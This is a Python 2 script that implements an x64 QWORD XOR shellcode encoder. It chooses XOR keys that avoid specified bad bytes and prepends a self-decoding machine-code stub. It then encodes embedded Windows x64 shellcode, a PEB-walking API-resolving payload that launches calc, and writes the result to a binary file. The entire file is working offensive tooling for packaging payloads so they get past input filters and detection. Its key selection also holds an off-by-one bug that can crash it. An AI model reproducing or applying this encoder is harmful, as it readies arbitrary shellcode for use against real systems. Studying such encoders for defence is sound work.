#!/usr/bin/env python
#Filename: Xor_QWORD_x64.py
#coding=utf-8

import re
import sys
import random
import struct

class QWORDXorEncoder:

	def __init__(self):
		self.name = "x64 QWORD Xor Encoder"
		self.description = "x64 QWORD Xor shellcode encoder"
		self.author = "Danny__Wei"
		self.bad_chars = []        
		self.bad_keys = [[] for i in range(8)]
		self.good_keys = [[] for i in range(8)]
		self.final_keys = []
		self.shellcode = ""
		self.encoded_shellcode = ""
		self.encoded_payload_length = 0
		self.encoder_bad_chars = ["48", "31", "c9", "81", "e9", "8d", "05", "bb", "58", "27", "2d", "f8", "ff", "e2", "f4"]
		self.misc_comments = """
            #This is the decoder stub
				"\x48\x31\xC9" +                 # xor rcx, rcx
				"\x48\x81\xE9" + block_count +   # sub ecx, block_count
				"\x48\x8D\x05\xEF\xFF\xFF\xFF" + # lea rax, [rel 0x0]
				"\x48\xBBXXXXXXXX" +             # mov rbx, 0x????????????????
				"\x48\x31\x58\x27" +             # xor [rax+0x27], rbx
				"\x48\x2D\xF8\xFF\xFF\xFF" +     # sub rax, -8
				"\xE2\xF4"                       # loop 0x1B
      """
	def all_the_stats(self):
		print "\n[Output] Encoder Name:\n" + self.name
		string_bad_chars = ''
		for bchar in self.bad_chars:
			string_bad_chars += hex(bchar) + " "
		print "\n[Output] Bad Character(s):\n" + string_bad_chars
		print "\n[Output] Shellcode length:\n" + str(self.encoded_payload_length)
		j = 1;
		key = 0
		for i in self.final_keys:
			key += i * j
			j *= 0x100
		print ('\n[Output] Xor Key:\n%08X' % key)

	def shellcode_to_bin(self):
		hFile = file('Xor_x64_encoded.bin', 'wb+')
		hFile.write(self.encoded_shellcode)
		hFile.close()
		return

	def set_shellcode(self, shellcode):
		shellcode = shellcode.decode('string-escape')
		self.shellcode = bytearray(shellcode)
		return

	# This function was copied from Justin Warner (@sixdub)
	def set_bad_characters(self, bad_characters):
		final_bad_chars = []
		bad_characters = bad_characters.split('x')

		# Do some validation on the received characters
		for item in bad_characters:
			if item == '':
				pass
			elif item in self.encoder_bad_chars:
				print "\n[Error] Encoder Error: Bad character specified is used for the decoder stub."
				print "[Error] Encoder Error: Please use different bad characters or another encoder!"
				sys.exit()
			else:
				if len(item) == 2:
                    # Thanks rohan (@cptjesus) for providing this regex code, and making me too lazt
                    # to do it myself
					rohan_re_code = re.compile('[a-f0-9]{2}',flags=re.IGNORECASE)
					if rohan_re_code.match(item):
						final_bad_chars.append(item)
					else:
						print "\n[Error] Bad Character Error: Invalid bad character detected."
						print "[Error] Bad Character Error: Please provide bad characters in \\x00\\x01... format."
						sys.exit()
				else:
					print "\n[Error] Bad Character Error: Invalid bad character detected."
					print "[Error] Bad Character Error: Please provide bad characters in \\x00\\x01... format."
					sys.exit()
		for x in final_bad_chars:
			self.bad_chars.append(int("0x"+x,16))
		return
		
	def find_bad_keys(self):
		for key in range(0x100):
			for bad in self.bad_chars:
				char = key ^ bad
				for count in xrange(8):
					for i in xrange(count, len(self.shellcode), 8):
						if char == self.shellcode[i]:
							self.bad_keys[count].append(key)
							break
		return

	def find_key(self):
		for count in xrange(8):
			for key in range(0x100):
				if key not in self.bad_keys[count]:
					self.good_keys[count].append(key)
		
		for count in xrange(8):
			if len(self.good_keys[count]) == 0:
				print "\n[Error] Encoder Error: Can't find available keys."
				print "[Error] Encoder Error: Please use different bad characters or another encoder!"
				sys.exit()
			i = random.randint(0, len(self.good_keys[count]))
			self.final_keys.append(self.good_keys[count][i])

		return	
		
	def decoder_stub(self):
		block_count = -( ( (len(self.shellcode) - 1) / 8) + 1)
		str = struct.pack('<l', block_count)

		decoder = "\x48\x31\xC9" + "\x48\x81\xE9" + str + "\x48\x8D\x05\xEF\xFF\xFF\xFF" + "\x48\xBBXXXXXXXX" + "\x48\x31\x58\x27" + "\x48\x2D\xF8\xFF\xFF\xFF" + "\xE2\xF4"
		
		'''
		decoder =   "\x48\x31\xC9" +               				# xor rcx, rcx
					"\x48\x81\xE9" + block_count +   			# sub ecx, block_count
					"\x48\x8D\x05\xEF\xFF\xFF\xFF" + 			# lea rax, [rel 0x0]
					"\x48\xBBXXXXXXXX" +           				# mov rbx, 0x????????????????
					"\x48\x31\x58\x27" +           				# xor [rax+0x27], rbx
					"\x48\x2D\xF8\xFF\xFF\xFF" +    			# sub rax, -8
					"\xE2\xF4"                       			# loop 0x1B
		'''
		
		return decoder
	
	def do_encode(self):
		stub = self.decoder_stub()

		key = 0
		str = ''
		for key in self.final_keys:
			str += struct.pack('B', key)
		
		stub = stub.replace('XXXXXXXX', str)
		
		# check out the final decoder stub
		for byte in bytearray(stub):
			if byte in self.bad_chars:
				print "\n[Error] Encoder Error: Bad character specified is used for the decoder stub."
				print "[Error] Encoder Error: Please use different bad characters or another encoder!"
				sys.exit()
		
		stub = bytearray(stub)
		
		mod = 0
		byte = 0
		count = 0
		for byte in bytearray(self.shellcode):
			if count < 8:
				mod = count
			else:
				mod = count % 8
			count += 1
			enbyte = byte ^ self.final_keys[mod]
			stub.append(enbyte)
		
		self.encoded_shellcode = stub
		self.encoded_payload_length = len(stub)
       
		return

	def encode(self):
		self.find_bad_keys()
		self.find_key()
		self.do_encode()

		
if __name__ == '__main__':
	shellcode = (
"\xFC\x48\x83\xE4\xF0\xE8\xC0\x00\x00\x00\x41\x51\x41\x50\x52\x51"
"\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52"
"\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A\x4D\x31\xC9\x48\x31\xC0"
"\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9\x0D\x41\x01\xC1\xE2\xED"
"\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C\x48\x01\xD0\x8B\x80\x88"
"\x00\x00\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44"
"\x8B\x40\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48"
"\x01\xD6\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1"
"\x38\xE0\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44"
"\x8B\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49"
"\x01\xD0\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A"
"\x41\x58\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41"
"\x59\x5A\x48\x8B\x12\xE9\x57\xFF\xFF\xFF\x5D\x48\xBA\x01\x00\x00"
"\x00\x00\x00\x00\x00\x48\x8D\x8D\x01\x01\x00\x00\x41\xBA\x31\x8B"
"\x6F\x87\xFF\xD5\xBB\xF0\xB5\xA2\x56\x41\xBA\xA6\x95\xBD\x9D\xFF"
"\xD5\x48\x83\xC4\x28\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47"
"\x13\x72\x6F\x6A\x00\x59\x41\x89\xDA\xFF\xD5\x63\x61\x6C\x63\x00")
	shell = QWORDXorEncoder()
	shell.set_shellcode(shellcode)
	shell.set_bad_characters('x00x0a')
	shell.encode()
	shell.all_the_stats()
	shell.shellcode_to_bin()
	
else:
	pass